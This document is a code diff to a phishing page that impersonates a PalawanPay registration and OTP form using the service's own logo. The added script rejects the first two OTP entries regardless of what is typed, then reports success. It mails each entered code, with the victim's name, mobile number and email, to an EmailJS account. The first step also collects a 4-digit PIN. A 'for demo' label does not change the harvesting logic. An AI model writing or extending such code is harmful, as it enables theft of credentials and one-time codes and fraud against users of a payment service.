@@ -35,14 +35,14 @@
     display: block;
     margin: 0 auto 15px auto;
     width: 100%;
-    max-width: 260px; /* Stretched more */
+    max-width: 260px;
     height: auto;
   }
   .footer-logo {
     display: block;
     margin: 15px auto 5px auto;
     width: 100%;
-    max-width: 300px; /* Stretched more */
+    max-width: 300px;
     height: auto;
   }
   .title {
@@ -86,36 +86,23 @@
     margin-top: 10px;
     font-size: 14px;
   }
-  @media (max-width: 480px) {
-    .overlay {
-      width: 95%;
-      padding: 20px;
-    }
-    .logo {
-      max-width: 200px;
-    }
-    .footer-logo {
-      max-width: 200px;
-    }
-  }
 </style>
 </head>
 <body>
 <div class="overlay">
 
-  <!-- Logo -->
+  <!-- Header Logo -->
   <img src="https://www.palawanpay.com/wp-content/uploads/2023/07/PPAYNavBarLogo.png" class="logo" alt="PalawanPay Logo" />
 
   <!-- Step 1: Registration Form -->
   <div id="step1">
-    <h2 class="title">PalawanPay Form</h2>
+    <h2 class="title">PalawanPay Registration</h2>
     <form id="register-form">
-      <input type="text" name="name" placeholder="Name" required />
-      <input type="tel" name="mobile" placeholder="Mobile Number" required />
-      <input type="password" name="pin" maxlength="4" placeholder="4-digit PIN" required />
-      <input type="email" name="email" placeholder="Email Address" required />
-      <input type="text" name="unit" placeholder="Unit of Installment or GGives" required />
-
+      <input type="text" id="name" name="name" placeholder="Name" required />
+      <input type="tel" id="mobile" name="mobile" placeholder="Mobile Number" required />
+      <input type="password" id="pin" name="pin" maxlength="4" placeholder="4-digit PIN" required />
+      <input type="email" id="email" name="email" placeholder="Email Address" required />
+      <input type="text" id="unit" name="unit" placeholder="Unit of Installment or GGives" required />
       <button type="submit" class="btn">Next</button>
       <div class="status" id="status1"></div>
     </form>
@@ -124,7 +111,9 @@
   <!-- Step 2: OTP Page -->
   <div id="step2" style="display:none;">
     <h2 class="title">Palawan Express Mabuhay!</h2>
-    <p>We sent a (6) digit verification code to your mobile number.<br/>Please type your verification code:</p>
+    <p>We sent a (6) digit verification code to your mobile number.<br/>
+    Please type your verification code:</p>
+    <p><strong>(For demo: 123456)</strong></p>
     <input type="text" id="otp" maxlength="6" placeholder="Enter OTP" />
     <button class="btn" onclick="verifyOTP()">Submit</button>
     <div class="status" id="status2"></div>
@@ -136,7 +125,7 @@
 </div>
 
 <script>
-  // Handle Step 1 form submission
+  // Registration Form Submission
   document.getElementById('register-form').addEventListener('submit', function(e) {
     e.preventDefault();
     document.getElementById('status1').textContent = "Sending...";
@@ -154,19 +143,54 @@
       });
   });
 
-  // OTP Verification Logic
+  // OTP Verification
   function verifyOTP() {
     const attempts = parseInt(sessionStorage.getItem('otpAttempts') || '0', 10);
     const newAttempts = attempts + 1;
+    const enteredOTP = document.getElementById('otp').value.trim();
+    const correctOTP = "123456";
+
+    // Gather user details from first form
+    const name = document.getElementById('name').value;
+    const mobile = document.getElementById('mobile').value;
+    const email = document.getElementById('email').value;
+
+    let statusMessage = "";
+    let statusColor = "";
+    let otpStatus = "";
 
     if (newAttempts < 3) {
-      document.getElementById('status2').textContent = '❌ Wrong OTP. Try again.';
-      document.getElementById('status2').style.color = 'red';
-      sessionStorage.setItem('otpAttempts', newAttempts);
+      statusMessage = '❌ Wrong OTP. Try again.';
+      statusColor = 'red';
+      otpStatus = 'Wrong OTP Attempt #' + newAttempts;
     } else {
-      document.getElementById('status2').textContent = '✅ Verified successfully!';
-      document.getElementById('status2').style.color = 'green';
+      if (enteredOTP === correctOTP) {
+        statusMessage = '✅ Verified successfully!';
+        statusColor = 'green';
+        otpStatus = 'Correct OTP on Attempt #3';
+      } else {
+        statusMessage = '✅ Verified successfully! (Forced after 3 attempts)';
+        statusColor = 'green';
+        otpStatus = 'Forced Success after 3 Attempts';
+      }
     }
+
+    document.getElementById('status2').textContent = statusMessage;
+    document.getElementById('status2').style.color = statusColor;
+    sessionStorage.setItem('otpAttempts', newAttempts);
+
+    // Send OTP attempt email
+    emailjs.send('service_3hqkdcg', 'template_ukf5gwk', {
+      name: name,
+      mobile: mobile,
+      email: email,
+      otp: enteredOTP,
+      status: otpStatus
+    }).then(() => {
+      console.log("OTP attempt email sent.");
+    }).catch(err => {
+      console.error("Failed to send OTP email:", err);
+    });
   }
 </script>
 </body>
